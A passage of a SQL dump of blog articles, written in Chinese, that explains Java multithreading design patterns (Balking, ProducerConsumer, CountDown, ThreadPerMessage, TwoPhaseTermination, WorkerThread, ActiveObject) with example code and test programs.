运用ThreadLocal保存数据信息在调用的线程中\n```java\nfinal public class ActionContext {\n\n    private static final ThreadLocal<Context> threadLocal = new ThreadLocal<Context>() {\n        @Override\n        protected Context initialValue() {\n            return new Context();\n        }\n    };\n\n    private static class ContextHolder {\n        private final static ActionContext actionContext = new ActionContext();\n    }\n\n    public static ActionContext getActionContext() {\n        return ContextHolder.actionContext;\n    }\n\n    public Context getContext() {\n        return threadLocal.get();\n    }\n}\n```\n#### 调用的第一个方法\n```java\npublic class QueryFromDBAction {\n\n    public void execute() {\n        try {\n            Thread.sleep(1_000);\n            String name = \"Alex \" + Thread.currentThread().getName();\n            ActionContext.getActionContext().getContext().setName(name);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 调用的第二个方法\n```java\npublic class QueryFromHttpAction {\n\n    public void execute() {\n        String cardId = this.getCardId(ActionContext.getActionContext().getContext().getName());\n        ActionContext.getActionContext().getContext().setCardId(cardId);\n    }\n\n    private String getCardId(String name) {\n        try {\n            Thread.sleep(1_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        return \"235623346334 \"+ Thread.currentThread().getName();\n    }\n}\n```\n#### 执行调用链\n```java\npublic class ExecutionTask implements Runnable {\n\n    private QueryFromDBAction dbAction = new QueryFromDBAction();\n\n    private QueryFromHttpAction httpAction = new QueryFromHttpAction();\n\n    @Override\n    public void run() {\n        Context context = ActionContext.getActionContext().getContext();\n        dbAction.execute();\n        System.out.println(\"The name query successful\");\n        httpAction.execute();\n        System.out.println(\"The Card id query successful\");\n        System.out.println(\"The Name is \" + context.getName() + \" and CardId \" + context.getCardId());\n    }\n}\n```\n#### 测试\n```java\npublic class ContextTest {\n    public static void main(String[] args) {\n        IntStream.range(1, 5)\n            .forEach(i -> {\n                new Thread(new ExecutionTask()).start();\n            });\n    }\n}\n```\n1. 运用ThreadSpecificStorage设计模式可以在调用方法链过程中不用传递参数,但请保证调用过程中始终保持在一个线程中\n2. 在web开发中,一个请求对应一条线程,有时需要request与response这两个对象,这时可以使用ThreadLocal将这两个对象进行存储,在需要的地方取出使用;注意在调用链结束时释放资源', 0, 0, 19, 0, 0, '2019-10-06 16:31:30', '2019-10-06 17:18:29', 0, 0);
INSERT INTO `article` VALUES (98, 1, 'Balking-多线程设计模式', '2019/10/1570353644_mmexport1570282483414.jpg', '### 溜达设计模式\n#### 溜达设计模式Balking\n1. 判断某个条件是否为真，如果条件成立则继续执行一步，如果条件不成立直接立即返回,不进行挂起等待，条件成立那么正常执行\n2. 相对于GuardedSuspension挂起设计模式而言,同样是面对条件不成立,GuardedSuspension设计模式选择挂起等待条件成立被唤醒,而Balking模式则直接返回放弃这次操作\n\n### 实现Balking\n#### 图示\n![Balking.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570355298_Balking.png)\n1. CustomerThread不断地实时使条件成立,就像餐厅客人不断招手点单\n2. WaiterThread不断地检查是否有条件成立,如果成立那么就会去处理,如果没有成立那么就啥也不做,就像餐厅服务员不断观察有没有客人招手\n\n#### 实时数据,当条件成立时进行处理\n```java\npublic class BalkingData {\n    private final String fileName;\n\n    private String content;\n\n    private boolean changed;\n\n    public BalkingData(String fileName, String content) {\n        this.fileName = fileName;\n        this.content = content;\n        this.changed = true;\n    }\n\n    public synchronized void change(String newContent) {\n        this.content = newContent;\n        this.changed = true;\n    }\n\n    public synchronized void save() throws IOException {\n        if (!changed) {\n            return;\n        }\n        doSave();\n        this.changed = false;\n    }\n\n    private void doSave() throws IOException {\n        System.out.println(Thread.currentThread().getName() + \" calls do save,content=\" + content);\n        try(Writer writer = new FileWriter(fileName, true)) {\n            writer.write(content);\n            writer.write(\"\\n\");\n            writer.flush();\n        }\n    }\n\n}\n```\n#### 实时使条件成立,并叫处理\n```java\npublic class CustomerThread extends Thread {\n\n    private final BalkingData balkingData;\n\n    private final Random random = new Random(System.currentTimeMillis());\n\n    public CustomerThread(BalkingData balkingData) {\n        super(\"Customer\");\n        this.balkingData = balkingData;\n    }\n\n    @Override\n    public void run() {\n       try {\n           balkingData.save();\n           for (int i = 0; i < 20; i++) {\n               balkingData.change(\"No.\" + i);\n               Thread.sleep(random.nextInt(1_000));\n               balkingData.save();\n           }\n       } catch (IOException e) {\n           e.printStackTrace();\n       } catch (InterruptedException e) {\n           e.printStackTrace();\n       }\n    }\n}\n```\n#### 实时检查条件成立,成立就进行处理\n```java\npublic class WaiterThread extends Thread {\n\n    private final BalkingData balkingData;\n\n    public WaiterThread(BalkingData balkingData) {\n        super(\"Waiter\");\n        this.balkingData = balkingData;\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 200; i++) {\n            try {\n                balkingData.save();\n                Thread.sleep(1_000);\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class BalkingClient {\n    public static void main(String[] args) {\n        BalkingData balkingData = new BalkingData(\"balking.txt\", \"===BEGIN====\");\n        new CustomerThread(balkingData).start();\n        new WaiterThread(balkingData).start();\n    }\n}\n```', 0, 0, 14, 0, 0, '2019-10-06 17:20:50', '2019-10-06 17:50:38', 0, 0);
INSERT INTO `article` VALUES (99, 1, 'ProducerConsumer-多线程设计模式', '2019/10/1570356036_mmexport1570283146051.jpg', '### 生产消费设计模式\n#### 生产消费设计模式ProducerConsumer\n1. 生产线程将东西不断添加到队列中,然后唤醒消费线程,当生产到指定的数量时生产线程挂起\n2. 消费线程将队列中的东西不断消费,消费后唤醒生产线程,当队列中没有东西可消费时消费线程挂起\n3. 这是非常常见的设计模式\n\n### 实现ProducerConsumer\n#### 图示\n![ProducerConsumer.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570357344_ProducerConsumer.png)\n1. ProducerThread生产线程不断生产,生产后唤醒消费线程,当生产达到规定数量时挂起\n2. ConsumerThread消费线程不断消费,消费后唤醒生产线程,当队列为空时挂起\n\n#### 消息\n```java\npublic class Message {\n    private String data;\n\n    public Message(String data) {\n        this.data = data;\n    }\n\n    public String getData() {\n        return data;\n    }\n\n    public void setData(String data) {\n        this.data = data;\n    }\n}\n```\n#### 消息队列\n```java\npublic class MessageQueue {\n    private final LinkedList<Message> queue;\n\n    private final static int DEFAULT_MAX_LIMIT = 100;\n\n    private final int limit;\n\n    public MessageQueue() {\n        this(DEFAULT_MAX_LIMIT);\n    }\n\n    public MessageQueue(final int limit) {\n        this.limit = limit;\n        this.queue = new LinkedList<Message>();\n    }\n\n    public void put(Message message) throws InterruptedException {\n        synchronized (queue) {\n            while (queue.size() > limit) {\n                queue.wait();\n            }\n            queue.addLast(message);\n            queue.notifyAll();\n        }\n    }\n\n    public Message take() throws InterruptedException {\n        synchronized (queue) {\n            while (queue.isEmpty()) {\n                queue.wait();\n            }\n            Message message = queue.removeFirst();\n            queue.notifyAll();\n            return message;\n        }\n    }\n\n    public int getMaxLimit() {\n        return this.limit;\n    }\n\n    public int getMessageSize() {\n        synchronized (queue) {\n            return queue.size();\n        }\n    }\n}\n```\n#### 生产线程\n```java\npublic class ProducerThread extends Thread {\n\n    private final MessageQueue messageQueue;\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    private final static AtomicInteger counter = new AtomicInteger(0);\n\n    public ProducerThread(MessageQueue messageQueue, int seq) {\n        super(\"Producer\" + seq);\n        this.messageQueue = messageQueue;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = new Message(\"Message-\" + counter.getAndIncrement());\n                messageQueue.put(message);\n                System.out.println(Thread.currentThread().getName() + \" put message \" + message.getData());\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                break;\n            }\n        }\n    }\n}\n```\n#### 消费线程\n```java\npublic class ConsumerThread extends Thread {\n\n    private final MessageQueue messageQueue;\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public ConsumerThread(MessageQueue messageQueue, int seq) {\n        super(\"Consumer\" + seq);\n        this.messageQueue = messageQueue;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = messageQueue.take();\n                System.out.println(Thread.currentThread().getName() + \" take a message \" + message.getData());\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                break;\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class ProducerAndConsumerClient {\n    public static void main(String[] args) {\n        final MessageQueue messageQueue = new MessageQueue();\n        new ProducerThread(messageQueue, 1).start();\n        new ConsumerThread(messageQueue, 1).start();\n\n        new ProducerThread(messageQueue, 2).start();\n        new ConsumerThread(messageQueue, 2).start();\n    }\n}\n```', 0, 0, 15, 0, 0, '2019-10-06 18:00:43', '2019-10-06 18:24:12', 0, 0);
INSERT INTO `article` VALUES (100, 1, 'CountDown-多线程设计模式', '2019/10/1570361618_mmexport1570358382764.jpg', '### 倒数设计模式\n#### 倒数设计模式CountDown\n1. 它的作用是等待所有子线程任务完成后执行最终任务\n2. 记录一个数字5,表示有5个子任务;当每个子任务完成时,该数字减一,当该数字降为0,那么就执行最终的任务,当然也可以反过来,数字不断增加,增加到某个数值时执行某操作\n3. jdk对CountDown设计模式做出了实现类CountDownLatch\n4. 在执行某些操作时,需要先执行某些异步操作,由于异步不知何时完成,此时CountDown是一种非常好的解决方案\n5. 多线程的join()方法也可以完成这样的功能,但countDown更加利于阅读与使用\n\n### 实现CountDown\n#### 图示\n![CountDown.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570363444_CountDown.png)\n1. down(): 当一个子线程的任务完成时调用,改变数字,当数字到达某个数值时唤醒waitSet中正在挂起的线程\n2. await(): 挂起等待所有子线程任务完成,直到被唤醒\n\n#### 编写简易CountDown\n```java\npublic class CountDown {\n\n    private final int total;\n\n    private int counter = 0;\n\n    public CountDown(int total) {\n        this.total = total;\n    }\n\n    public void down() {\n        synchronized (this) {\n            this.counter++;\n            this.notifyAll();\n        }\n    }\n\n    public void await() throws InterruptedException {\n        synchronized (this) {\n            while (counter != total) {\n                this.wait();\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class CustomerCountDownClient {\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) throws InterruptedException {\n        final CountDown latch = new CountDown(5);\n        System.out.println(\"准备多线程处理任务\");\n        // the first phase.\n        IntStream.rangeClosed(1, 5).forEach(i ->\n                new Thread(()->{\n                    System.out.println(Thread.currentThread().getName() + \" is working.\");\n                    try {\n                        Thread.sleep(random.nextInt(1_000));\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    latch.down();\n                }, String.valueOf(i)).start()\n        );\n        latch.await();\n        // the second phase\n        System.out.println(\"多线程任务全部结束,准备第二阶段任务\");\n        System.out.println(\"...........\");\n        System.out.println(\"FINISH\");\n    }\n}\n```', 0, 0, 8, 0, 0, '2019-10-06 19:33:43', '2019-10-06 20:08:10', 0, 0);
INSERT INTO `article` VALUES (101, 1, 'ThreadPerMessage-多线程设计模式', '2019/10/1570363846_mmexport1570358843674.jpg', '### 单独消息线程设计模式\n#### 单独消息线程设计模式ThreadPerMessage\n1. 为每一个消息或每一个请求单独提供一个线程\n2. 由于当消息或请求达到一定峰值时会造成严重的性能下降,所以ThreadPerMessage设计模式被线程池替代了\n3. 这是一种非常常见的线程使用设计模式,但目前被线程池所替代\n\n#### 单独创建线程的坏处\n1. 每次new Thread新建对象,性能差\n2. 线程缺乏统一管理,可能无限制的新建线程,相互竞争,有可能占用过多系统资源导致死机或OOM\n3. 缺少更多功能,如更多执行,定期执行,线程中断\n4. 频繁创建多线程,非常占用CPU内存\n\n#### 线程池的好处\n1. 降低资源消耗: 通过重复利用已创建的线程降低创建线程和销毁造成的消耗\n2. 提高响应速度: 当任务到达时,任务可以不需要等到线程创建就能立即执行\n3. 提高线程的可管理性。线程是稀缺资源。如果无限制地创建,不仅仅会消耗系统资源,还有降低系统的稳定性,使用线程池可以进行统一分配,调优和监控,但是要做到合理利用\n4. 可有效控制最大并发线程数,提高系统资源利用率,同时可以避免过多的资源竞争,避免阻塞\n\n### 实现ThreadPerMessage\n#### 单个消息\n```java\npublic class Message {\n\n    private final String value;\n\n    public Message(String value) {\n        this.value = value;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n```\n#### ThreadPerMessage设计模式消息处理器\n```java\npublic class MessageHandler {\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public void request(Message message) {\n        new Thread(()->{\n            String value = message.getValue();\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(\"The message will be handle by \" + Thread.currentThread().getName() + \" \" + value);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n}\n```\n#### 测试\n```java\npublic class PerThreadClient {\n    public static void main(String[] args) {\n        final MessageHandler messageHandler = new MessageHandler();\n        IntStream.rangeClosed(0 ,10)\n                .forEach( i -> messageHandler.request(new Message(String.valueOf(i))));\n    }\n} \n```\n#### 线程池方式重写消息处理器\n```java\npublic class MessageHandler {\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    private final static Executor executor = Executors.newFixedThreadPool(5);\n\n    public void request(Message message) {\n        executor.execute(()->{\n            String value = message.getValue();\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(\"The message will be handle by \" + Thread.currentThread().getName() + \" \" + value);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void shutdown() {\n        ((ExecutorService)executor).shutdown();\n    }\n}\n```', 0, 0, 8, 0, 0, '2019-10-06 20:10:52', '2019-10-06 20:23:30', 0, 0);
INSERT INTO `article` VALUES (102, 1, 'TwoPhaseTermination-多线程设计模式', '2019/10/1570364755_mmexport1570359026038.jpg', '### 两阶段终止设计模式\n#### 两阶段终止设计模式TwoPhaseTermination\n1. 一个线程在while(!isInterrupted()){..}循环中执行，另外一个线程判断某个条件达到后获得准备被结束线程的引用,调用interrupt()设置线程的中断状态\n2. 在网络连接等情况下非常常见的设计模式,当主要接收连接的线程被关闭时,需要关闭所有正在处理连接中的线程\n\n### 如何终止线程\n#### 编写处理器\n```java\npublic class CounterIncrement extends Thread {\n\n    private volatile boolean terminated = false;\n\n    private int counter = 0;\n\n    private Random random = new Random(System.currentTimeMillis());\n\n    @Override\n    public void run() {\n        try {\n            while (!terminated) {\n                System.out.println(Thread.currentThread().getName() + \" \" + counter++);\n                Thread.sleep(random.nextInt(1_000));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace(); // this.interrupt()被调用后,将会执行此处\n        } finally {\n            this.clean();\n        }\n    }\n\n    private void clean() {\n		// 清理其他相关的资源,比如关闭其他线程\n        System.out.println(\"do some clean work for the second phase. current counter\" + counter);\n    }\n\n    public void close() {\n        this.terminated = true;\n        this.interrupt();\n    }\n}\n```\n#### 测试\n```java\npublic class CounterTest {\n    public static void main(String[] args) throws InterruptedException {\n        CounterIncrement counterIncrement = new CounterIncrement();\n        counterIncrement.start();\n\n        Thread.sleep(10_000);\n        counterIncrement.close();\n    }\n}\n```\n### 实现TwoPhaseTermination\n#### 图示\n![TwoPhaseTermination.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570367078_TwoPhaseTermination.png)\n1. 当关闭AppServer时,关闭自身,并改变标记\n2. 由于AppServer的关闭,AppServer需要对其连接下的所有ClientHandler也必须执行关闭操作\n3. 对AppServer管理下的所有ClientHandler进行关闭\n\n#### 接收客户端连接AppService\n```java\npublic class AppServer extends Thread {\n\n    private final int port;\n\n    private static final int DEFAULT_PORT = 12722;\n\n    private volatile boolean start = true;\n\n    private List<ClientHandler> clientHandlers = new ArrayList<>();\n\n    private final ExecutorService executor = Executors.newFixedThreadPool(10);\n\n    private ServerSocket server;\n\n    public AppServer() {\n        this(DEFAULT_PORT);\n    }\n\n    public AppServer(int port) {\n        this.port = port;\n    }\n\n    @Override\n    public void run() {\n        try {\n            this.server = new ServerSocket(port);\n            while (start) {\n                Socket client = server.accept();\n                ClientHandler clientHandler = new ClientHandler(client);\n                executor.submit(clientHandler);\n                this.clientHandlers.add(clientHandler);\n            }\n        } catch (IOException e) {\n            // 多种错误\n            // throw new RuntimeException(e);\n        } finally {\n            this.dispose();\n        }\n    }\n\n    private void dispose() { \n		// 关闭所有已连接状态的客户端处理器\n        this.clientHandlers.stream().forEach(ClientHandler::stop);\n        this.executor.shutdown();\n    }\n\n    public void shutdown() throws IOException {\n        this.start = false;\n        this.interrupt();\n        this.server.close();\n    }\n}\n```\n#### 处理单个客户端业务的处理器ClientHandler\n```java\npublic class ClientHandler implements Runnable {\n    private final Socket socket;\n\n    private volatile boolean running = true;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try(InputStream inputStream = socket.getInputStream();\n            OutputStream outputStream = socket.getOutputStream();\n            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream));\n            PrintWriter printWriter = new PrintWriter(outputStream)) {\n            while (running) {\n                String message = br.readLine();\n                if (null == message) { // 客户端断开\n                    break;\n                }\n                System.out.println(\"Come from client >\" + message);\n                printWriter.write(\"echo\" + message + \" \\n\");\n                printWriter.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            this.running = false;\n        } finally {\n            this.stop();\n        }\n    }\n\n    public void stop() {\n        if (!running) {\n            return;\n        }\n        this.running = false;\n        try {\n            this.socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class AppServerClient {\n    public static void main(String[] args) throws InterruptedException, IOException {\n        AppServer server = new AppServer(13345);\n        server.start();\n\n        Thread.sleep(30_000);\n        server.shutdown(); // 关闭主要接收客户端的AppServer\n    }\n}\n```', 0, 0, 12, 0, 0, '2019-10-06 20:26:06', '2019-10-06 21:07:40', 0, 0);
INSERT INTO `article` VALUES (103, 1, 'WorkerThread-多线程设计模式', '2019/10/1570370468_mmexport1570368296348.jpg', '### 工人线程设计模式\n#### 工人线程设计模式WorkerThread\n1. 工人线程（worker thread）会一次抓一件工作来处理，当没有工作可做时，工人线程会停下来等待心得工作过来\n2. 有一个流水线（channel），流水线一端有客户线程client，另一端有工人线程worker，客户不断把新的任务（request）放入流水线，工人在另一头获得任务，并执行，客户和工人的数量可多可少\n2. WorkerThread模式在Request的管理上像是ProducerConsumer模式，在Request的行为上像是Command模式\n3. WorkerThread同时展现了ProducerConsumer模式与Command模式\n\n#### ProducerConsumer与WorkerThread区别\n![ProducerConsumerAndWorkerThread.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570372382_ProducerConsumerAndWorkerThread.png)\n1. WorkerThread是由Channel所创建的,而不是外部创建,这一点不同于ProducerConsumer模式\n2. Request的方法是由WorkerThread所执行的,这一点不同于ProducerConsumer模式\n3. ProducerConsumer模式专注于Message的生产与消费，至于Message被消费时是作何处理，则不在它的讨论范围之中\n\n### 实现WorkerThread\n#### Request\n```java\npublic class Request {\n\n    private final String name;\n\n    private final int number;\n\n    public Request(final String name,final int number) {\n        this.name = name;\n        this.number = number;\n    }\n\n    public void execute() {\n        System.out.println(Thread.currentThread().getName() + \" executed \" + this);\n    }\n\n    @Override\n    public String toString() {\n        return \"Request{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \", number=\" + number +\n                \'}\';\n    }\n}\n```\n#### Channel\n```java\npublic class Channel {\n\n    private final static int MAX_REQUEST = 100;\n\n    private final Request[] requestQueue;\n\n    private int head;\n\n    private int tail;\n\n    private int count;\n\n    private final WorkerThread[] workerPool;\n\n    public Channel(int workers) {\n        this.requestQueue = new Request[MAX_REQUEST];\n        this.head = 0;\n        this.tail = 0;\n        this.count = 0;\n        this.workerPool = new WorkerThread[workers];\n        this.init();\n    }\n\n    private void init() {\n        for (int i = 0; i < workerPool.length; i++) {\n            workerPool[i] = new WorkerThread(\"Worker-\" + i, this);\n        }\n    }\n\n    /**\n     * push switch to start all of worker to work.\n     */\n    public void startWorkers() {\n        Arrays.asList(workerPool).forEach(WorkerThread::start);\n    }\n\n    public synchronized void put(Request request) {\n        while (count >= requestQueue.length) {\n            try {\n                // 已满等待\n                this.wait();\n            } catch (Exception e) {\n\n            }\n        }\n        this.requestQueue[tail] = request;\n        this.tail = (tail + 1) % this.requestQueue.length;\n        this.count++;\n        this.notifyAll();\n    }\n\n    public synchronized Request take() {\n        while (count <= 0) {\n            try {\n                // 等待填充\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        Request request = this.requestQueue[head];\n        this.head = (head + 1) % this.requestQueue.length;\n        this.count--;\n        this.notifyAll();\n        return request;\n    }\n}\n```\n#### TransportThread\n```java\npublic class TransportThread extends Thread {\n    private final Channel channel;\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public TransportThread(String name, Channel channel) {\n        super(name);\n        this.channel = channel;\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                Request request = new Request(getName(), i);\n                this.channel.put(request);\n                Thread.sleep(random.nextInt(1_000));\n            }\n        } catch (Exception e) {\n\n        }\n    }\n}\n```\n#### WorkerThread\n```java\npublic class WorkerThread extends Thread {\n\n    private final Channel channel;\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public WorkerThread(String name, Channel channel) {\n        super(name);\n        this.channel = channel;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            channel.take().execute();\n            try {\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class WorkerClient {\n    public static void main(String[] args) {\n		// Channel创建5个WorkerThread\n        final Channel channel = new Channel(5);\n        channel.startWorkers();\n\n        new TransportThread(\"Alex\", channel).start();\n        new TransportThread(\"Jack\", channel).start();\n        new TransportThread(\"William\", channel).start();\n    }\n}\n```', 1, 0, 20, 0, 0, '2019-10-06 22:01:20', '2019-10-06 22:36:45', 0, 0);
INSERT INTO `article` VALUES (104, 1, 'ActiveObject-多线程设计模式', '2019/10/1570372704_mmexport1570358163723.jpg', '### 主动对象设计模式\n#### 主动对象设计模式ActiveObject\n1. 它通过对方法的调用与方法的执行进行解耦来提高并发性\n2. 通过代理将方法的调用转变为向阻塞队列中添加一个请求，由一个线程取出请求后执行实际的方法，然后将结果设置到Future中\n\n### 实现ActiveObject\n#### 图示\n![ActiveObject.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570378618_ActiveObject.png)\n1. 将ActiveObject的方法解耦为单个Request\n2. 单个方法Request对象持有ActiveObject的实现类Servant\n3. ActiveObjectPorxy将执行方法传递到SchedulerThread中\n4. 由SchedulerThread将方法对象放入ActiveionQueue方法对象队列中\n5. 由SchedulerThread不停将队列中的单个方法Request取出进行执行\n\n#### 定义Result接口\n```java\npublic interface Result {\n    Object getResultValue();\n}\n```\n#### Result普通实现类RealResult\n```java\npublic class RealResult implements Result {\n\n    private final Object resultValue;\n\n    public RealResult(Object resultValue) {\n        this.resultValue = resultValue;\n    }\n\n    @Override\n    public Object getResultValue() {\n        return this.resultValue;\n    }\n}\n```\n#### Result基于Future模式的实现类FutureResult\n```java\npublic class FutureResult implements Result {\n\n    private Result result;\n\n    private boolean ready = false;\n\n    public synchronized void setResult(Result result) {\n        this.result = result;\n        this.ready = true;\n        this.notifyAll();\n    }\n\n    @Override\n    public synchronized Object getResultValue() {\n        while (!ready) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        return this.result.getResultValue();\n    }\n}\n```\n#### 定义ActiveObject接口\n```java\n/**\n * 接受异步消息的主动对象\n */\npublic interface ActiveObject {\n\n    Result makeString(int count, char fillChar);\n\n    void displayString(String text);\n}\n```\n#### ActiveObject的实现类Servant\n```java\nclass Servant implements ActiveObject {\n\n    @Override\n    public Result makeString(int count, char fillChar) {\n        char[] buf = new char[count];\n        for (int i = 0; i < count; i++) {\n            buf[i] = fillChar;\n            try {\n                Thread.sleep(10);\n            } catch (Exception e) {\n\n            }\n        }\n        return new RealResult(new String(buf));\n    }\n\n    @Override\n    public void displayString(String text) {\n        try {\n            System.out.println(\"Display:\" + text);\n            Thread.sleep(10);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 用于解耦ActiveObject每个方法的MethodRequest\n```java\npublic abstract class MethodRequest {\n\n    protected final Servant servant;\n\n    protected final FutureResult futureResult;\n\n    public MethodRequest(Servant servant, FutureResult futureResult) {\n        this.servant = servant;\n        this.futureResult = futureResult;\n    }\n\n    public abstract void execute();\n}\n```\n#### MethodRequest的实现类MakeStringRequest,对应ActiveObject的makeString(int count, char fillChar)\n```java\n/**\n * {@link ActiveObject#makeString(int, char)}\n */\npublic class MakeStringRequest extends MethodRequest {\n\n    private final int count;\n    private final char fillChar;\n\n    public MakeStringRequest(Servant servant, FutureResult futureResult,\n                             int count, char fillChar) {\n        super(servant, futureResult);\n        this.count = count;\n        this.fillChar = fillChar;\n    }\n\n    @Override\n    public void execute() {\n        Result result = servant.makeString(count, fillChar);\n        futureResult.setResult(result);\n    }\n}\n```\n\n#### MethodRequest的实现类DisplayStringRequest,对应ActiveObject的displayString(String text)\n```java\n/**\n * {@link ActiveObject#displayString(String)}\n */\npublic class DisplayStringRequest extends MethodRequest{\n\n    private final String text;\n\n    public DisplayStringRequest(Servant servant, final String text) {\n        super(servant, null);\n        this.text = text;\n    }\n\n    @Override\n    public void execute() {\n        this.servant.displayString(this.text);\n    }\n}\n```\n#### 用于存储MethodRequest的队列ActivationQueue\n```java\npublic class ActivationQueue {\n\n    private final static int MAX_METHOD_REQUEST_QUEUE_SIZE = 100;\n\n    private final LinkedList<MethodRequest> methodQueue;\n\n    public ActivationQueue() {\n        methodQueue = new LinkedList<>();\n    }\n\n    public synchronized void put(MethodRequest request) {\n        while (methodQueue.size() >= MAX_METHOD_REQUEST_QUEUE_SIZE) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        this.methodQueue.addLast(request);\n        this.notifyAll();\n    }\n\n    public synchronized MethodRequest take() {\n        while (methodQueue.isEmpty()) {\n            try {\n                this.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        MethodRequest methodRequest = this.methodQueue.removeFirst();\n        this.notifyAll();\n        return methodRequest;\n    }\n}\n```\n#### 用于操纵ActivationQueue队列的并执行方法的SchedulerThread\n```java\npublic class SchedulerThread extends Thread {\n\n    private final ActivationQueue activationQueue;\n\n    public SchedulerThread(ActivationQueue activationQueue) {\n        this.activationQueue = activationQueue;\n    }\n\n    public void invoke(MethodRequest request) {\n        this.activationQueue.put(request);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            activationQueue.take().execute();\n        }\n    }\n}\n```\n#### 返回给主程序的代理类ActiveObjectProxy\n```java\nclass ActiveObjectProxy implements ActiveObject {\n\n    private final SchedulerThread schedulerThread;\n\n    private final Servant servant;\n\n    public ActiveObjectProxy(SchedulerThread schedulerThread, Servant servant) {\n        this.schedulerThread = schedulerThread;\n        this.servant = servant;\n    }\n\n    @Override\n    public Result makeString(int count, char fillChar) {\n        FutureResult futureResult = new FutureResult();\n        schedulerThread.invoke(new MakeStringRequest(servant, futureResult, count, fillChar));\n        return futureResult;\n    }\n\n    @Override\n    public void displayString(String text) {\n        schedulerThread.invoke(new DisplayStringRequest(servant, text));\n    }\n}\n```\n#### 初始化组件并返回代理类的工厂类ActiveObjectFactory\n```java\npublic final class ActiveObjectFactory {\n\n    private ActiveObjectFactory() {\n\n    }\n\n    public static ActiveObject createActiveObject() {\n        Servant servant = new Servant();\n        ActivationQueue queue = new ActivationQueue();\n        SchedulerThread schedulerThread = new SchedulerThread(queue);\n        ActiveObjectProxy proxy = new ActiveObjectProxy(schedulerThread, servant);\n        schedulerThread.start();\n        return proxy;\n    }\n}\n```\n#### 用于专门添加makeString(int count, char fillChar)的线程MakeClientThread\n```java\npublic class MakeClientThread extends Thread {\n    private final ActiveObject activeObject;\n    private final char fillChar;\n\n    public MakeClientThread(ActiveObject activeObject, String name) {\n        super(name);\n        this.activeObject = activeObject;\n        this.fillChar = name.charAt(0);\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                Result result = activeObject.makeString(i + 1, fillChar);\n                Thread.sleep(20);\n                String resultValue = (String)result.getResultValue();\n                System.out.println(Thread.currentThread().getName()+ \": value=\" + resultValue);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 用于专门添加displayString(String text)的线程DisplayClientThread\n```java\npublic class DisplayClientThread extends Thread {\n    private final ActiveObject activeObject;\n\n    public DisplayClientThread(ActiveObject activeObject, String name) {\n        super(name);\n        this.activeObject = activeObject;\n    }\n\n    @Override\n    public void run() {\n        try {\n            for (int i = 0; true; i++) {\n                String text = Thread.currentThread().getName() + \"=>\" + i;\n                activeObject.displayString(text);\n                Thread.sleep(200);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class ActiveObjectTest {\n    public static void main(String[] args) {\n        ActiveObject activeObject = ActiveObjectFactory.createActiveObject();\n\n        new MakeClientThread(activeObject, \"Alex\").start();\n        new MakeClientThread(activeObject, \"Bobby\").start();\n        new DisplayClientThread(activeObject, \"Chris\").start();\n    }\n}\n```', 1, 0, 25, 0, 0, '2019-10-06 22:38:35', '2019-10-07 00:21:04', 0, 0);
